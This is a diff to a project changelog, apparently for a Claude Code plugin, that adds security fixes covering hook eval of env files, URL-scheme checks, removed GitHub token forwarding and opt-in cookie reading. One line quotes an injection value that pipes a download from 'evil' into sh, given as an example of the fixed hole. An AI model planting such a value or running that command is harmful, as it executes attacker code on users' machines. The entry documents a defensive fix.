@@ -5,6 +5,25 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Security
+
+- **SessionStart hook no longer evaluates env-file values as shell code.** `hooks/scripts/check-config.sh` previously parsed `.claude/last30days.env` and `~/.config/last30days/.env` by `eval`ing each `KEY=value` line. A per-project env file containing a crafted value (e.g. `FOO="; curl evil|sh;#`) would execute arbitrary shell on every SessionStart. Values are now assigned indirectly via `printf -v`, and keys are validated against the shell-identifier regex. Malicious values are treated as data, not code.
+- **HTTP requests restricted to `http`/`https` schemes.** `scripts/lib/http.py` now validates the URL scheme at the top of `request()`. Python's `urllib.request.urlopen` otherwise honors `file://`, `ftp://`, and other schemes, which was a defense-in-depth gap for any future code path that templates a URL against partially untrusted input.
+- **GitHub PAT authentication removed.** The first-run wizard no longer shells out to `gh auth token` and POSTs the resulting GitHub personal access token to ScrapeCreators. That path sent whatever scopes the user's `gh` login had configured — commonly `repo, read:org, gist, workflow` — to a third party for what is functionally an identity check. Setup now always uses the GitHub device flow, which requests least-privilege `read:user user:email` with explicit GitHub-side user consent. `auth_with_pat()` and `_PAT_BASE` are removed; `run_github_auth()` is retained as a thin alias for `run_full_device_auth()` so `last30days setup --github` and external callers keep working.
+- **Browser cookie extraction is now opt-in.** `FROM_BROWSER` unset (or set to `off`) no longer silently reads Firefox and Safari cookie jars on every pipeline invocation. Users must set `FROM_BROWSER=auto` (or a specific browser name) to enable the zero-config X/Twitter and Truth Social path. First-run setup writes `FROM_BROWSER=off` unless cookies were found in a specific browser during the wizard, in which case it pins to that browser. Unknown `FROM_BROWSER` values are treated as `off` rather than silently falling back.
+
+### Migration
+
+Existing installs with `FROM_BROWSER=auto`, `FROM_BROWSER=firefox`, etc. in their `.env` are unaffected. Users who have been relying on the old implicit default (no `FROM_BROWSER` set, cookies picked up silently from Firefox/Safari) will see X search report "no X source" until they either:
+
+- Set `FROM_BROWSER=auto` in `~/.config/last30days/.env` (or per-project `.claude/last30days.env`), or
+- Provide explicit `AUTH_TOKEN` and `CT0` in their env, or
+- Provide `XAI_API_KEY`.
+
+Re-running `/last30days` with no X config surfaces the just-in-time X-unlock prompt documented in SKILL.md.
+
 ## [3.0.9] - 2026-04-18 - The Self-Debug Release
 
 ### Highlights
